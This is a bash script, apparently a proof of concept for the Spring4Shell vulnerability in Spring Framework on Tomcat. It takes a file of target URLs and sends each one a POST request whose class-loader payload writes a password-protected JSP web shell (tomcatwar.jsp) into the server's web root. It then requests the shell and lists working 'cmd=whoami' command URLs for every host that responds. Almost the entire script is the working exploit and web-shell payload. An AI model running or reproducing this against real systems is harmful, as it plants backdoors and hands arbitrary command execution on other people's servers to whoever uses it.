#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

file=$1

if [ $1 == "--help" 2>/dev/null ]; then
	echo -e "Usage: "
	echo -e "\t./SpringCorePoC.sh path-to-file-with urls"

elif [ -z $1  ]; then
	echo "./SpringCorePoC.sh --help"
else
	for url in $(cat $file); do
	command=$(curl -s -k -X POST -H @headers -o /dev/null --data-binary $'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' -w ${turquoiseColour}'Status: ''%{http_code}'${endColour}${grayColour},${endColour}${yellowColour}' Length: '"%{size_download} bytes"${endColour}${grayColour},${endColour} $url)
	command2=$(curl -s -k -X GET -o /dev/null -w ${turquoiseColour}'Status: ''%{http_code}'${endColour}${grayColour},${endColour}${yellowColour}' Length: '"%{size_download} bytes"${endColour}${grayColour}${endColour} $url/tomcatwar.jsp)
	echo -e "$command $command2" &>/dev/null
		if [ $(echo "$command2" | grep -oP "200") == $(echo -e "200") ]; then
			echo -e "${redColour}$url/tomcatwar.jsp?pwd=j&cmd=whoami${endColour} ${grayColour}|${endColour} $command2 ${grayColour}-${endColour} ${redColour}Potentially vulnerable${endColour}"
		fi 2>/dev/null
	done 2>/dev/null
fi
